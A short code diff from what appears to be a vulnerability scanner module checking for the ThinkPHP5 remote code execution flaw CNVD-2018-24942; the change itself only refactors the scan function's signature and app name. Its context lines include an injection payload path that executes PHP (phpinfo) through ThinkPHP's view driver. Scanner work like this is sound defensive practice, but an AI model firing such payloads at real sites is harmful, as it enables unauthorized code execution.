@@ -11,12 +11,12 @@ cnvd_2018_24942_payloads = [
     {'path': 'index.php?s=index/\\think\\view\driver\Php/display&content=<?php phpinfo();?>'}
 ]
 
-def cnvd_2018_24942_scan(self, clients):
+def cnvd_2018_24942_scan(clients):
     ''' ThinkPHP5 未开启强制路由RCE'''
     client = clients.get('reqClient')
 
     vul_info = {
-        'app_name': self.app_name,
+        'app_name': 'ThinkPHP',
         'vul_type': 'RCE',
         'vul_id': 'CNVD-2018-24942',
     }
